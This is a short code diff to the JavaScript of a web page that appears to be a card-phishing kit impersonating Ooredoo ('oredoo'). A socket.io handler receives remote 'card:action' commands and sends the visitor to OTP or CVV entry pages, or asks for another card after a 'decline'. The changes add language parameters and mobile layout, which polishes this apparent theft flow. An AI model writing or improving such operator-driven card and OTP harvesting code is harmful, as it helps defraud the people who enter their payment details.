@@ -598,10 +598,12 @@ body {
 
   socket.on('card:action', function(action) {
     var act = (typeof action === 'string') ? action : (action && action.action) || '';
+    var currentLang = localStorage.getItem('siteLang') || localStorage.getItem('oredoo_site_language') || 'ar';
+    var langParam = currentLang === 'en' ? '?lang=en' : '';
     if (act === 'otp') {
-      window.location.href = '/otp-verification/';
+      window.location.href = '/otp-verification/' + langParam;
     } else if (act === 'atm') {
-      window.location.href = '/cvv/';
+      window.location.href = '/cvv/' + langParam;
     } else if (act === 'reject') {
       var lang = localStorage.getItem('siteLang') || localStorage.getItem('oredoo_site_language') || 'ar';
       document.getElementById('waitingMsg').textContent = lang === 'en' ? 'Card declined. Please try another card.' : 'تم رفض البطاقة. يرجى المحاولة ببطاقة أخرى.';
@@ -755,8 +757,12 @@ body {
       // Selects and inputs
       document.getElementById('cardMonth').options[0].textContent = 'Month';
       document.getElementById('cardYear').options[0].textContent = 'Year';
-      // Row: Expiry on LEFT, CVV on RIGHT (same row)
-      rowFields.style.flexDirection = 'row';
+      // Row: Expiry on LEFT, CVV on RIGHT (same row on desktop, column on mobile)
+      if (window.innerWidth > 600) {
+        rowFields.style.flexDirection = 'row';
+      } else {
+        rowFields.style.flexDirection = 'column';
+      }
       rowFields.insertBefore(expiryGroup, cvvGroup);
       // Expiry selects order: Month first, Year second
       var expirySelects = document.querySelector('.expiry-selects');
